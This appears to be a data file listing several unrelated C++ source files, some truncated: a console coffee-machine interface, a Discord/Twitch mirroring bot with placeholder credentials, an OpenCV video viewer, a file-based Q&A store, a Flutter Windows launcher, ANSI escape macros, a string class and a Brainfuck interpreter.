    "#include \"Classes.h\"\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n\r\n\r\n// additional cfunctions used in display()\r\nvoid moveCursor(int row, int col) {\r\n\tcout << \"\\033[\" << row << \";\" << col << \"H\";\r\n}\r\n\r\n\r\n\r\nvoid setConsoleTextColor(int color) {\r\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\r\n}\r\n\r\n\r\n\r\n\r\nvoid coffeDraw() {\r\n\r\n\tint initial_row =9;\r\n\t// Glasses drawing \r\n\tfor (int k_0 = 0; k_0 < 4; k_0++) {\r\n\t\tfor (int k_1 = 0; k_1 < 3; k_1++) {\r\n\t\t\tmoveCursor(initial_row + k_0, 4 + k_1 * 16);\r\n\t\t\tcout << \"|      |\";\r\n\t\t}\r\n\t\tcout << endl;\r\n\t}\r\n\tfor (int k_1 = 0; k_1 < 3; k_1++) {\r\n\t\tmoveCursor(initial_row + 4, 4 + k_1 * 16);\r\n\t\tcout << \"````````\";\r\n\t}\r\n\r\n\t// Coffe drawing\r\n\tfor (int k_0 = 0; k_0 < 4; k_0++) {\r\n\t\tfor (int k_1 = 0; k_1 < 3; k_1++) {\r\n\t\t\tmoveCursor( initial_row + k_0, 5 + k_1 * 16);\r\n\r\n\t\t\tif (k_0 < 2) {\r\n\t\t\t\tswitch (k_1) {\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tsetConsoleTextColor(0);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tsetConsoleTextColor(0 * 16 + 6);\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tsetConsoleTextColor(15);\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tdefault:\r\n\t\t\t\t\tsetConsoleTextColor(15);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse setConsoleTextColor(0 * 16 + 6);\r\n\r\n\t\t\tcout << \"wwwwww\";\r\n\t\t}\r\n\t\tcout << endl;\r\n\t\tsetConsoleTextColor(7);\r\n\t}\r\n\r\n}\r\n\r\nint Interface::display(int actual_state, string choosen_drink,int timeMarker, int expectedFullTime, string communicat )\r\n{\r\n\t// \r\n\tmoveCursor(0, 0);\r\n\t// Constant Heading\r\n\r\n\tcout << \"-----------------------------------------------------------------------\" << endl;  // line 1 \r\n\r\n\tcout << \"                            Virtual Coffe Machine             \" << endl;\t// line 2 \r\n\r\n\tcout << \"-----------------------------------------------------------------------\" << endl;  // line 3 \r\n\r\n\r\n\r\n\r\n    switch ( actual_state  ) {\r\n\r\n    case 1:\t// Case 1 -> making an order \r\n        \r\n\tcout << \"Please, choose drink:          \" << endl; // line 4\r\n\t//Espresso\r\n\tmoveCursor(6, 0);\r\n\tcout << \"1 - Esspresso\";\r\n\tmoveCursor(6, 19);\r\n\tcout << \"2 - Americano \";\r\n\tmoveCursor(6, 35);\r\n\tcout << \"3 - Cappucino \";\r\n\tmoveCursor(6, 52);\r\n\tcout << \"Exit\";\r\n\tmoveCursor(6, 62);\r\n\tcout << \"Cleaning\";\r\n\tsetConsoleTextColor(7);\r\n\t//out << \"1 -> Espresso\t2 -> Americano\t3 -> Capuccino\" << endl; //line 5\r\n\tcoffeDraw(); //lines 6 - 9\r\n\tcout << endl;\r\n\r\n        break;\r\n\r\n\tcase 2: // Case 2 -> prepering Coffe\r\n\t\tcout << \"***********************************************************************\"<<endl; // line 4\r\n\t\tcout << \"     Prepering for you:   \" << choosen_drink << endl;\r\n\t\tcout << \"***********************************************************************\" << endl;\r\n\t\tcout << endl;\r\n\t\tfor (int k = 0; k <= timeMarker ; k++) {\r\n\t\t\tsetConsoleTextColor(0x20 | 0x0F);\r\n\t\t\tcout << \" \";\r\n\t\t}\r\n\t\tfor (int k = 0; k <= (expectedFullTime - timeMarker); k++) {\r\n\t\t\tsetConsoleTextColor(0x70 | 0x0F);\r\n\t\t\tcout << \" \";\r\n\t\t}\r\n\t\tsetConsoleTextColor(0x00 | 0x0F);\r\n\t\tcout << endl;\r\n\t\tcout << \"           \"  << communicat << endl;\r\n\r\n\r\n\t\tcout << endl;\r\n\t\t\r\n\r\n\t\tbreak;\r\n\r\n\r\n\tcase 3 : // Case 3 -> Coffe is ready \r\n\r\n\r\n\t\tcout << endl << endl; // line 4,5\r\n\t\tmoveCursor(6, 10);\r\n\t\tcout << communicat;\r\n\t\tcout << endl << endl << endl << endl ;\r\n\t\t// lines 10 and 11 here \r\n\t\tsetConsoleTextColor(8);\r\n\t\tcout << \"                     _________\" << endl;\r\n\t\tcout << \"                     |       |\" << endl;\r\n\t\tcout << \"                     |       |\" << endl;\r\n\t\tcout << \"                     |_______|\" << endl;\r\n\t\tcout << \"                      |_____|\" << endl;\r\n\t\tsetConsoleTextColor(7);\r\n\t\t\tif (timeMarker % 2 == 0){\r\n\t\t\t\tmoveCursor(8,23);\r\n\t\t\t\tcout << \"(  ) ( \";\r\n\t\t\t\tmoveCursor(9,23);\r\n\t\t\t\tcout << \" )(   )\";\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tmoveCursor(8, 23);\r\n\t\t\t\tcout << \" )(  ) \";\r\n\t\t\t\tmoveCursor(9, 23);\r\n\t\t\t\tcout << \"(  )( \";\r\n\r\n\t\t\t}\r\n\t\t\r\n\r\n\r\n\t\tbreak;\r\n\r\n\r\n\tcase 4: // Case 4-> Empty tanks\r\n\t\tcout << endl << endl;\r\n\t\tsetConsoleTextColor(4);\r\n\t\tcout << \"!!!   Empty tank, please refill   !!!\";\r\n\t\tsetConsoleTextColor(7);\r\n\t\tbreak;\r\n\r\n\tcase 5: // Case 5 - > Cleaning\r\n\t\tcout << endl << endl;\r\n\t\t\r\n\t\tsetConsoleTextColor(4);\r\n\t\tcout << \" cleaning procedure, please wait...\";\r\n\t\tcout << endl << endl;\r\n\t\tfor (int k = 0; k <= timeMarker; k++) {\r\n\t\t\tsetConsoleTextColor(0x20 | 0x0F);\r\n\t\t\tcout << \" \";\r\n\t\t}\r\n\t\tfor (int k = 0; k <= (expectedFullTime - timeMarker); k++) {\r\n\t\t\tsetConsoleTextColor(0x70 | 0x0F);\r\n\t\t\tcout << \" \";\r\n\t\t}\r\n\t\tcout << endl;\r\n\t\tsetConsoleTextColor(2);\r\n\t\tif (timeMarker >= (expectedFullTime)) cout << \" cleaning procedure is done\";\r\n\t\tsetConsoleTextColor(7);\r\n\t\r\n\t\tbreak;\r\n    default:\r\n        \r\n        break;\r\n\r\n\r\n\r\n\t\r\n\r\n\t\treturn 0;\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\nvoid Interface:: simulationDisplay(bool grinder, bool loading, bool emptying, bool pressurePump, bool milkPump, bool waterIntake, bool heater, int pressureSens, int waterTempSens, int milkTempSens, int waterVolSens) {\r\n\r\n\tbool WorkinSys[7] = { grinder, loading, emptying, pressurePump, milkPump, waterIntake, heater };\r\n\r\n\tint Sensor[4] = { waterVolSens,pressureSens,waterTempSens,milkTempSens };\r\n\r\n\tmoveCursor(20, 0); \r\n\tcout << \"Mo",
    "#include \"MirrorBotDiscord.h\"\n#include \"MirrorBotTwitch.h\"\n#include <dpp/dpp.h>\n#include <iostream>\n\n\n//Token\nconst std::string BOT_TOKEN = \"<Discord-Token>\";\nconst std::string TWITCH_SERVER = \"<Twitch-Server>\";\nconst int TWITCH_PORT = 6667;\nconst std::string TWITCH_NICK = \"<Username-Of-Bot-Account>\";\nstd::string TWITCH_OAUTH;\nconst std::string TWITCH_CHANNEL = \"<Twitch-Channel-To-Join>\";\nvolatile bool MirrorD = false;\nvolatile bool MirrorT = false;\nvolatile bool END = false;\nvolatile bool ENDRT = false;\nvolatile bool ENDST = false;\n\nint main() {\n    //Starts the bot cluster\n    dpp::cluster bot(BOT_TOKEN, dpp::i_default_intents | dpp::i_message_content);\n\n    //Tells bot to log\n    bot.on_log(dpp::utility::cout_logger());\n\n\n    /*Initialize IRC libraries*/\n    WSADATA wsaData;\n    HINTERNET hInternet = InternetOpen(L\"TwitchBot\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n    if (!hInternet) {\n        std::cerr << \"Failed to initialize WinINet.\" << std::endl;\n        return 0;\n    }\n\n    int ref = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (ref != 0) {\n        std::cout << \"Winsock Error: \" << ref << std::endl;\n        return 0;\n    }\n\n    //Channels called and errors handled\n    SOCKET ket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    if (ket == INVALID_SOCKET)\n    {\n        std::cout << \"Ket Error: \" << WSAGetLastError() << std::endl;\n        return 0;\n    }\n\n    //Set up address resolution hints\n    struct addrinfo hints, * servinfo;\n    memset(&hints, 0, sizeof hints);\n    hints.ai_family = AF_INET;       // Use AF_INET for IPv4 addresses\n    hints.ai_socktype = SOCK_STREAM; // Use SOCK_STREAM for TCP\n\n    //Resolve the server address and port\n    int getaddrResult = getaddrinfo(TWITCH_SERVER.c_str(), std::to_string(TWITCH_PORT).c_str(), &hints, &servinfo);\n    if (getaddrResult != 0) {\n        std::cout << \"getaddrinfo failed: \" << getaddrResult << std::endl;\n        WSACleanup();\n        return 0;\n    }\n\n    //Connection and error handling\n    if (connect(ket, servinfo->ai_addr, (int)servinfo->ai_addrlen) != 0)\n    {\n        std::cout << \"connect() error: \" << WSAGetLastError() << std::endl;\n        freeaddrinfo(servinfo);\n        WSACleanup();\n        return 0;\n    }\n    std::cout << \"connected\" << std::endl;\n\n    //Clean up the address info structure\n    freeaddrinfo(servinfo);\n   \n    //Request Oauth code for login\n    HINTERNET hUrl = InternetConnectA(hInternet, \"id.twitch.tv\", INTERNET_DEFAULT_HTTPS_PORT,\n        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);\n    if (hUrl) {\n        HINTERNET hRequest = HttpOpenRequestA(hUrl, \"POST\", \"/oauth2/token\", NULL, NULL,\n            NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 1);\n        if (hRequest) {\n            std::string postData = \"grant_type=refresh_token\";\n            postData += \"&refresh_token=<Refresh-Token-Here>\";\n            postData += \"&client_id=<Client-Id-Here>\";\n            postData += \"&client_secret=<Secret-Here>\";\n\n            std::string headers = \"Content-Type: application/x-www-form-urlencoded\";\n\n            bool sent = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),\n                (LPVOID)postData.c_str(), postData.length());\n                \n            char buffer[1024];\n            DWORD bytesRead = 0;\n            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n                TWITCH_OAUTH.append(buffer, bytesRead);\n                }\n            TWITCH_OAUTH = TWITCH_OAUTH.substr(17, 30);\n            TWITCH_OAUTH = \"oauth:\" + TWITCH_OAUTH;\n            std::cout << TWITCH_OAUTH << std::endl;\n        }\n    }\n\n    //Sends loging information to Twitch\n    sendCmd(ket, \"PASS \" + TWITCH_OAUTH);\n    sendCmd(ket, \"NICK \" + TWITCH_NICK);\n    sendCmd(ket, \"JOIN \" + TWITCH_CHANNEL);\n\n    InternetCloseHandle(hInternet);\n    \n    //Discord Bot\n    \n     message_create_event(bot);\n     handle_SlashCommands(bot);\n    \n    std::thread discordThread([&bot] {\n        runDiscordBot(bot);\n        });\n\n    //Twitch Bot Threads\n    std::thread toQueue([&ket] {\n        toQueue(ket);\n        });\n    std::thread fromQueue([&ket] { \n        fromQueue(ket); \n        });\n    \n\n    //starts the cluster and returns to code\n\tbot.start(dpp::st_return);\n   \n    //waits for three threads to return\n    fromQueue.join();\n    toQueue.join();\n    discordThread.join();\n\n\n    //cleanup and shutdown\n    closesocket(ket); \n    bot.shutdown();\n\n\treturn true;\n}\n",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n\n// define videoinfo struct\nstruct VideoInfo\n{\n    int width;\n    int height;\n    float fps;\n    int total_frame_num;\n};\n\nVideoInfo get_video_info(cv::VideoCapture &vc)\n{\n    VideoInfo info;\n    info.width = vc.get(cv::CAP_PROP_FRAME_WIDTH);\n    info.height = vc.get(cv::CAP_PROP_FRAME_HEIGHT);\n    info.fps = vc.get(cv::CAP_PROP_FPS);\n    info.total_frame_num = vc.get(cv::CAP_PROP_FRAME_COUNT);\n\n    return info;\n}\n\nint show_video(const std::string &vid_name)\n{\n    cv::VideoCapture vc(vid_name);\n    if (not vc.isOpened())\n    {\n        std::cout << \"Please check the video name\" << std::endl;\n        return -1;\n    }\n    VideoInfo info = get_video_info(vc);\n    std::cout << \"the width of the video is \" << info.width << std::endl;\n    std::cout << \"the height of the video is \" << info.height << std::endl;\n    std::cout << \"the fps of the video is \" << info.fps << std::endl;\n    std::cout << \"the total frame number of the video is \" << info.total_frame_num << std::endl;\n\n    while (true)\n    {\n        cv::Mat frame;\n        vc >> frame;\n        if (frame.empty())\n        {\n            break;\n        }\n        cv::namedWindow(\"cup video\", cv::WINDOW_NORMAL);\n        cv::imshow(\"cup video\", frame);\n        // 1s = 1000ms, waitKey for millisecond\n        cv::waitKey(1000 / info.fps);\n    }\n    cv::waitKey(0);\n    cv::destroyAllWindows();\n\n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    std::string vid_name = \"./cup.mp4\";\n    return show_video(vid_name);\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string>\r\n#include <vector>\r\n#include <map>\r\n\r\nusing namespace std;\r\n\r\nstruct User\r\n{\r\n    int id;\r\n    string user_name;\r\n    int password;\r\n    string name;\r\n    string email;\r\n    bool is_AQ;\r\n\r\n    User()\r\n        : id(0)\r\n        , password(0)\r\n        , is_AQ(false)\r\n    {}\r\n\r\n    static map<int, User> read_users(const string& file_path)\r\n    {\r\n        map<int, User> users;\r\n        ifstream file(file_path);\r\n        if (!file.is_open()) {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n            return users;\r\n        }\r\n        string line;\r\n        while (getline(file, line)) {\r\n            istringstream iss(line);\r\n            User user;\r\n            iss >> user.id >> user.user_name >> user.password >> user.name >>\r\n                user.email >> user.is_AQ;\r\n            users[user.id] = user;\r\n        }\r\n        file.close();\r\n        return users;\r\n    }\r\n\r\n    static void write_user(const User& user, const string& file_path)\r\n    {\r\n        ofstream file(file_path, ios::app);\r\n        if (file.is_open()) {\r\n            file << user.id << \" \" << user.user_name << \" \" << user.password << \" \"\r\n                << user.name << \" \" << user.email << \" \" << user.is_AQ << endl;\r\n            file.close();\r\n        }\r\n        else {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n        }\r\n    }\r\n};\r\n\r\nstruct Question\r\n{\r\n    int from_id;\r\n    int to_id;\r\n    int id_question;\r\n    string parent_question;\r\n    string answer;\r\n    bool is_parent;\r\n\r\n    Question()\r\n        : from_id(0)\r\n        , to_id(0)\r\n        , id_question(0)\r\n        , is_parent(false)\r\n    {}\r\n\r\n    static vector<Question> read_questions(const string& file_path)\r\n    {\r\n        vector<Question> questions;\r\n        ifstream file(file_path);\r\n        if (!file.is_open()) {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n            return questions;\r\n        }\r\n        string line;\r\n        while (getline(file, line)) {\r\n            istringstream iss(line);\r\n            Question q;\r\n            iss >> q.from_id >> q.to_id >> q.id_question >> q.is_parent;\r\n            getline(iss, q.parent_question, '?');\r\n            q.parent_question += '?';\r\n            iss.ignore();\r\n            getline(iss, q.answer);\r\n            questions.push_back(q);\r\n        }\r\n        file.close();\r\n        return questions;\r\n    }\r\n\r\n    static void write_question(const Question& question, const string& file_path)\r\n    {\r\n        ofstream file(file_path, ios::app);\r\n        if (file.is_open()) {\r\n            file << question.from_id << \" \" << question.to_id << \" \"\r\n                << question.id_question << \" \" << question.is_parent << \" \"\r\n                << question.parent_question << \" \" << question.answer << endl;\r\n            file.close();\r\n        }\r\n        else {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n        }\r\n    }\r\n\r\n    static void delete_question(int question_id, const string& file_path)\r\n    {\r\n        vector<Question> questions = read_questions(file_path);\r\n        ofstream file(file_path, ios::trunc);\r\n        if (!file.is_open()) {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n            return;\r\n        }\r\n        for (const auto& q : questions) {\r\n            if (q.id_question != question_id) {\r\n                file << q.from_id << \" \" << q.to_id << \" \" << q.id_question << \" \"\r\n                    << q.is_parent << \" \" << q.parent_question << \" \" << q.answer\r\n                    << endl;\r\n            }\r\n        }\r\n        file.close();\r\n    }\r\n\r\n    static void delete_related_questions(int parent_question_id,\r\n        const string& file_path)\r\n    {\r\n        vector<Question> questions = read_questions(file_path);\r\n        ofstream file(file_path, ios::trunc);\r\n        if (!file.is_open()) {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n            return;\r\n        }\r\n        for (const auto& q : questions) {\r\n            if (q.id_question != parent_question_id &&\r\n                q.to_id != parent_question_id) {\r\n                file << q.from_id << \" \" << q.to_id << \" \" << q.id_question << \" \"\r\n                    << q.is_parent << \" \" << q.parent_question << \" \" << q.answer\r\n                    << endl;\r\n            }\r\n        }\r\n        file.close();\r\n    }\r\n};\r\nstruct ThreadQuestion\r\n{\r\n    int from_id;\r\n    int to_id;\r\n    int id_thread_question;\r\n    string thread_question;\r\n    string answer;\r\n\r\n    ThreadQuestion()\r\n        : from_id(0)\r\n        , to_id(0)\r\n        , id_thread_question(0)\r\n    {}\r\n\r\n    static vector<ThreadQuestion> read_thread_questions(const string& file_path)\r\n    {\r\n        vector<ThreadQuestion> thread_questions;\r\n        ifstream file(file_path);\r\n        if (!file.is_open()) {\r\n            cerr << \"Unable to open file: \" << file_path << endl;\r\n            return thread_questions;\r\n        }\r\n        stri",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hardware_market\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): General anscii codes\n\n#define ANSI_BEL\t\t\t\t\"\\a\"\n#define ANSI_BS\t\t\t\t\t\"\\b\"\n#define ANSI_HT\t\t\t\t\t\"\\t\"\n#define ANSI_LF\t\t\t\t\t\"\\n\"\n#define ANSI_VT\t\t\t\t\t\"\\v\"\n#define ANSI_FF\t\t\t\t\t\"\\f\"\n#define ANSI_CR\t\t\t\t\t\"\\r\"\n#define ANSI_ESC\t\t\t\t\"\\033\"\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): Cursor controls\n\n#define ANSI_ESC_TO_POS\t\t\t\tANSI_ESC \"[H\"\n#define ANSI_ESC_TO_LC(l,c)\t\t\tANSI_ESC \"\\[\" #l \";\" #c \"f\"\n#define ANSI_ESC_N_UP(n) \t\t\tANSI_ESC \"\\[\" #n \"A\"\n#define ANSI_ESC_N_DOWN(n)\t\t\tANSI_ESC \"\\[\" #n \"B\"\n#define ANSI_ESC_N_RIGHT(n)\t\t\tANSI_ESC \"\\[\" #n \"C\"\n#define ANSI_ESC_N_LEFT(n)\t\t\tANSI_ESC \"\\[\" #n \"D\"\n#define ANSI_ESC_START_OF_N_DOWN(n)\t\tANSI_ESC \"\\[\" #n \"E\"\n#define ANSI_ESC_START_OF_N_UP(n)\t\tANSI_ESC \"\\[\" #n \"F\"\n#define ANSI_ESC_TO_COL_N(n)\t\t\tANSI_ESC \"\\[\" #n \"G\"\n#define ANSI_ESC_REQ_CURSOR_POS(l,c)\t\tANSI_ESC \"\\[\" #l \";\" #c \"R\"\n#define ANSI_ESC_UP_W_SCROLL\t\t\tANSI_ESC \"[M\"\n#define ANSI_ESC_SAVE_CURSOR_POS_DEC\t\tANSI_ESC \"[7\"\n#define ANSI_ESC_SAVE_CURSOR_POS_SCO\t\tANSI_ESC \"[7\"\n#define ANSI_ESC_RESTORE_LAST_CURSOR_POS_DEC\tANSI_ESC \"[8\"\n#define ANSI_ESC_RESTORE_LAST_CURSOR_POS_SCO\tANSI_ESC \"[8\"\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): Erase functions\n\n#define ANSI_ESC_ERASE_TO_SCREEN_END\t\tANSI_ESC \"[0J\"\n#define ANSI_ESC_ERASE_FROM_SCREEN_START\tANSI_ESC \"[1J\"\n#define ANSI_ESC_ERASE_SCREEN\t\t\tANSI_ESC \"[2J\"\n#define ANSI_ESC_ERASE_SAVED\t\t\tANSI_ESC \"[3J\"\n#define ANSI_ESC_ERASE_IN_LINE\t\t\tANSI_ESC \"[K\"\n#define ANSI_ESC_ERASE_TO_END\t\t\tANSI_ESC \"[0K\"\n#define ANSI_ESC_ERASE_FROM_START\t\tANSI_ESC \"[1K\"\n#define ANSI_ESC_ERASE_LINE\t\t\tANSI_ESC \"[2K\"\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): Text decoration\n\n#define ANSI_ESC_RESET_ALL\t\t\tANSI_ESC \"[0m\"\n#define ANSI_ESC_BOLD\t\t\t\tANSI_ESC \"[1m\"\n#define ANSI_ESC_BOLD_RESET\t\t\tANSI_ESC \"[21m\"\n#define ANSI_ESC_DIM\t\t\t\tANSI_ESC \"[2m\"\n#define ANSI_ESC_DIM_RESET\t\t\tANSI_ESC \"[22m\"\n#define ANSI_ESC_ITALIC\t\t\t\tANSI_ESC \"[3m\"\n#define ANSI_ESC_ITALIC_RESET\t\t\tANSI_ESC \"[23m\"\n#define ANSI_ESC_UNDERLINE\t\t\tANSI_ESC \"[4m\"\n#define ANSI_ESC_UNDERLINE_RESET\t\tANSI_ESC \"[24m\"\n#define ANSI_ESC_BLINK\t\t\t\tANSI_ESC \"[5m\"\n#define ANSI_ESC_BLINK_RESET\t\t\tANSI_ESC \"[25m\"\n#define ANSI_ESC_INVERSE\t\t\tANSI_ESC \"[7m\"\n#define ANSI_ESC_INVERSE_RESET\t\t\tANSI_ESC \"[27m\"\n#define ANSI_ESC_HIDDEN\t\t\t\tANSI_ESC \"[8m\"\n#define ANSI_ESC_HIDDEN_RESET\t\t\tANSI_ESC \"[28m\"\n#define ANSI_ESC_STRIKETHROUGH\t\t\tANSI_ESC \"[9m\"\n#define ANSI_ESC_STRIKETHROUGH_RESET\t\tANSI_ESC \"[29m\"\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): RGB color\n\n#define ANSI_ESC_RGB_FG(r,g,b)\t\t\tANSI_ESC \"[38;2;\" #r \";\" #g \";\" #b \"m\"\n#define ANSI_ESC_RGB_BG(r,g,b)\t\t\tANSI_ESC \"[48;2;\" #r \";\" #g \";\" #b \"m\"\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// NOTE(Elias): Screen modes\n\n#define ANSI_ESC_CURSOR_HIDDEN\t\t\tANSI_ESC \"[?25l\"\n#define ANSI_ESC_CURSOR_VISIBLE\t\t\tANSI_ESC \"[?25h\"\n#define ANSI_ESC_RESTORE_SCREEN\t\t\tANSI_ESC \"[?47l\"\n#define ANSI_ESC_SAVE_SCREEN\t\t\tANSI_ESC \"[?47h\"\n#define ANSI_ESC_ENABLE_ALT_BUFFER\t\tANSI_ESC \"[?1049h\"\n#define ANSI_ESC_DISABLE_ALT_BUFFER\t\tANSI_ESC \"[?1049l\"\n\n\n// NOTE(Elias): view others at:\n// https://gist.github.com/fnky/458719343aabd01cfb17a3a4f7296797\n",
    "#include \"MyString.h\"\n\nusing namespace std;\n\nMyString::MyString() : data(nullptr), length(0) {}\n\nMyString::MyString(const char* str) {\n    length = strlen(str);\n    data = new char[length + 1];\n    strcpy_s(data, length + 1, str);\n}\n\nMyString::~MyString() {\n    delete[] data;\n}\n\nMyString::MyString(const MyString& other) : MyString(other.data) {}\n\nMyString& MyString::operator=(const MyString& other) {\n    if (this != &other) {\n        delete[] data;\n        length = other.length;\n        data = new char[length + 1];\n        strcpy_s(data, length + 1, other.data);\n    }\n    return *this;\n}\n\nsize_t MyString::size() const {\n    return length;\n}\n\nconst char& MyString::operator[](size_t index) const {\n    return data[index];\n}\n\nvoid MyString::print() const {\n    if (data != nullptr) {\n        cout << data << endl;\n    }\n}\n\nsize_t MyString::find(const MyString& str, size_t pos) const {\n    if (data && str.data) {\n        const char* found = strstr(data + pos, str.data);\n        if (found)\n            return found - data;\n    }\n    return npos;\n}\n\nMyString& MyString::replace(size_t pos, size_t len, const MyString& str) {\n    size_t newLen = length - len + str.length;\n    char* newData = new char[newLen + 1];\n\n    strncpy_s(newData, newLen + 1, data, pos);\n    strcpy_s(newData + pos, newLen + 1 - pos, str.data);\n    strcpy_s(newData + pos + str.length, newLen + 1 - pos - str.length, data + pos + len);\n\n    delete[] data;\n    data = newData;\n    length = newLen;\n\n    return *this;\n}\n\nMyString::operator std::string() const {\n    return std::string(data);\n}\n\nistream& operator>>(istream& is, MyString& str) {\n    std::string temp;\n    is >> temp;\n    str = temp.c_str();\n    return is;\n}\n",
    "#include \"interpretator.h\"\n\nchar Interpretator::cpu[30000];\n\nInterpretator::Interpretator() {}\n\nvoid Interpretator::manage(Args *args) {\n    filesystem::path cwd = filesystem::current_path();\n\n    if (args->args.count(\"target_file\") >= 2 && args->args.count(\"target_dir\") >= 2) {\n        cout << \"target_file and target_dir arguments cannot be used simultaneously\" << endl;\n        exit(0);\n    }\n\n    bool save_mode = false;\n\n    if (args->args.count(\"s\") == 1) {\n        save_mode = (string)args->args.at(\"s\") == \"true\";\n    }\n    if (args->args.count(\"target_file\") == 1) {\n        this->target_file(args->args.at(\"target_file\"), save_mode);\n    }\n    if (args->args.count(\"target_dir\") == 1) {\n        this->target_dir(cwd, save_mode);\n    }\n}\n\nstring Interpretator::interpretate() {\n    string output;\n    unsigned int j = 0;\n    int brc = 0;\n    unsigned int e_count = 0;\n    char operators[8] = {'>', '<', '+', '-', '.', ',', '[', ']'};\n    for (int i = 0; i < this->acc.size(); ++i) {\n        auto it = find(begin(operators), end(operators), this->acc[i]);\n        if (it == end(operators)) {\n            if (e_count > 3) {\n                cout << \"Brainfuck code not found\" << endl;\n                exit(0);\n            }\n            e_count++;\n            continue;\n        }\n\n        if (this->acc[i] == '>') j++;\n        if (this->acc[i] == '<') j--;\n        if (this->acc[i] == '+') this->cpu[j]++;\n        if (this->acc[i] == '-') this->cpu[j]--;\n        if (this->acc[i] == '.') output+=this->cpu[j];\n        if (this->acc[i] == ',') cin >> this->cpu[j];\n        if (this->acc[i] == '[') {\n            if (!this->cpu[j]) {\n                ++brc;\n                while (brc) {\n                    ++i;\n                    if (this->acc[i] == '[')\n                        ++brc;\n                    if (this->acc[i] == ']')\n                        --brc;\n                }\n            } else continue;\n        } else if (this->acc[i] == ']') {\n            if (!this->cpu[j]) continue;\n            else {\n                if (this->acc[i] == ']') brc++;\n                while (brc) {\n                    --i;\n                    if (this->acc[i] == '[') brc--;\n                    if (this->acc[i] == ']') brc++;\n                }\n                --i;\n            }\n        }\n    }\n    return output;\n}\nvoid Interpretator::target_dir(string dir, bool save) {\n    map<string, string> files;\n    map<string, string>::iterator file_iter;\n\n    map<string, string> outputs;\n    map<string, string>::iterator output_iter;\n\n    for (const auto &entity : filesystem::directory_iterator(dir)) {\n        filesystem::path path = entity.path();\n        if (path.extension() == \".bf\") {\n            files[path] = path;\n        }\n    }\n\n    cout << \"Found \" << files.size() << \" brainfucks files\" << endl << endl;\n\n    for (file_iter = files.begin(); file_iter != files.end(); file_iter++) {\n        this->acc.clear();\n        memset(this->cpu, 0, sizeof(this->cpu));\n\n        string filename = file_iter->first;\n        string path = file_iter->second;\n\n        char ch;\n        ifstream infile(path);\n        if (infile) {\n            while (infile) {\n                infile.get(ch);\n                this->acc.push_back(ch);\n            }\n            infile.close();\n        }\n\n        string data = this->interpretate();\n        outputs[filename] = data;\n    }\n\n    for (output_iter = outputs.begin(); output_iter != outputs.end(); output_iter++) {\n        string file = output_iter->first;\n        string data = output_iter->second;\n\n        if (!save) {\n            stringstream ss(file);\n            string token;\n            vector<string> tokens;\n\n            while (getline(ss, token, '/')) {\n                tokens.push_back(token);\n            }\n\n\n            cout << \"Filename: \" << tokens.back() << endl;\n            cout << data << endl << endl;\n        }\n        else {\n            ofstream ofile(file);\n            ofile << data;\n            ofile.close();\n\n            cout << \"File updated\" << endl;\n        }\n    }\n}\n\nvoid Interpretator::target_file(string file, bool save) {\n    char ch;\n    ifstream infile(file);\n    if (infile) {\n        while (infile) {\n            infile.get(ch);\n            this->acc.push_back(ch);\n        }\n        infile.close();\n    }\n    else {\n        cout << \"File not found\" << endl;\n        exit(0);\n    }\n\n    string data = this->interpretate();\n\n    if (save){\n        ofstream ofile(file);\n        ofile << data;\n        ofile.close();\n\n        cout << \"File updated\" << 